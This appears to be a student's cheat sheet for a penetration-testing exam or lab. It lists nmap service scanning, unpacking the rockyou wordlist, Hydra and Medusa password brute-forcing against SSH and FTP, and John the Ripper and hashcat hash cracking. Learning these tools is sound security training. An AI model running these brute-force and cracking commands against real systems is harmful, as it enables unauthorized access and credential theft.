⁠ bash
nmap -sV <target_ip>
 ⁠

### fix wordlist

⁠ bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
 ⁠

### HYDRA

⁠ bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>
 ⁠

### MEDUSA

⁠ bash
medusa -h <target_ip> -u user -P /usr/share/wordlists/rockyou.txt -M ssh
medusa -h <target_ip> -u user -P /usr/share/wordlists/rockyou.txt -M ftp
 ⁠

### EXTRA (exam bonus)

⁠ bash
hydra -L users.txt -P passwords.txt ssh://<target_ip>
medusa -h <target_ip> -U users.txt -P passwords.txt -M ssh
 ⁠

### HASH CRACKING

⁠ bash
john hash.txt
john --show hash.txt

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 ⁠

